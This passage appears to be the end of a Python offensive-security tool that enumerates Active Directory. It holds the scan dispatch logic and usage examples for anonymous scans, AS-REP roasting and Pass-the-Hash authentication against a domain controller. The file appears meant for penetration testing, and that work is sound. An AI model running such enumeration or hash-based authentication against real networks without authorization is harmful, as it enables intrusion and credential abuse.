    findings['asrep_users'] = check_asrep_roastable_users(target_ip, findings.get('domain_dn'), list(master_user_set))
    return findings

def run_authenticated_scan(target_ip, username, password, lmhash, nthash):
    """
    Executes all authenticated enumeration modules and returns a dictionary of findings.
    """
    findings = {}
    domain, user = parse_identity(username)

    if not domain:
        domain = get_domain_from_ldap(target_ip)
        if not domain:
            print_error("Could not auto-discover domain. Authentication may fail.")

    search_base, user_groups, ldap_findings = enumerate_ldap_auth(target_ip, domain, user, password, lmhash, nthash)
    findings.update(ldap_findings)

    if search_base: # Only run if LDAP auth was successful
        misconfig_findings = find_ad_misconfigs_auth(target_ip, domain, user, password, lmhash, nthash, search_base)
        findings.update(misconfig_findings)
        findings['domain_name'] = search_base.replace("DC=", "").replace(",", ".")

    enumerate_smb_shares_auth(target_ip, domain, user, password, lmhash, nthash)

    check_access_paths_auth(target_ip, user_groups, user, password, lmhash, nthash, domain)
    return findings

def main():
    parser = argparse.ArgumentParser(
        description="A comprehensive Active Directory enumeration tool.",
        epilog=f"""
Examples:
  Run anonymous scan (null sessions, AS-REP roast, etc.):
    {Style.CYAN}python %(prog)s 192.168.56.10{Style.RESET}

  Run authenticated scan with a password:
    {Style.CYAN}python %(prog)s 192.168.56.10 -u 'DOMAIN/user' -p 'Password123'{Style.RESET}

  Run authenticated scan using Pass-the-Hash:
    {Style.CYAN}python %(prog)s 172.16.10.5 -u 'Admin' -H 'aad3...:31d6...'{Style.RESET}
""",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument("target", help="The target IP address of the Domain Controller.")

    auth_group = parser.add_argument_group('Authenticated Scan Options')
    auth_group.add_argument("-u", "--username", help="Username for authentication (e.g., 'user' or 'DOMAIN/user').")
    auth_group.add_argument("-p", "--password", help="Password for authentication.")
    auth_group.add_argument("-H", "--hashes", help="LM:NT hash for Pass-the-Hash authentication.")

    args = parser.parse_args()

    try:
        ipaddress.ip_address(args.target)
    except ValueError:
        print_error(f"Invalid target IP address: {args.target}")
        sys.exit(1)

    # Determine scan mode based on provided arguments
    is_authenticated_scan = bool(args.username and (args.password or args.hashes))

    if is_authenticated_scan:
        if args.password and args.hashes:
            parser.error("Please provide either a password (-p) or hashes (-H), not both.")
        
        password = args.password or ""
        lmhash, nthash = ("", "")
        if args.hashes:
            lmhash, nthash = parse_hashes(args.hashes)
        
        print_section_header(f"Starting Authenticated Scan on {args.target}")
        findings = run_authenticated_scan(args.target, args.username, password, lmhash, nthash)
        auth_creds = {'username': args.username, 'password': password, 'lmhash': lmhash, 'nthash': nthash}
        print_suggestions(args.target, findings, auth_creds)
    else:
        print_section_header(f"Starting Anonymous Scan on {args.target}")
        findings = run_anonymous_scan(args.target)
        print_suggestions(args.target, findings)

    print_section_header("Scan Complete")

if __name__ == "__main__":
    main()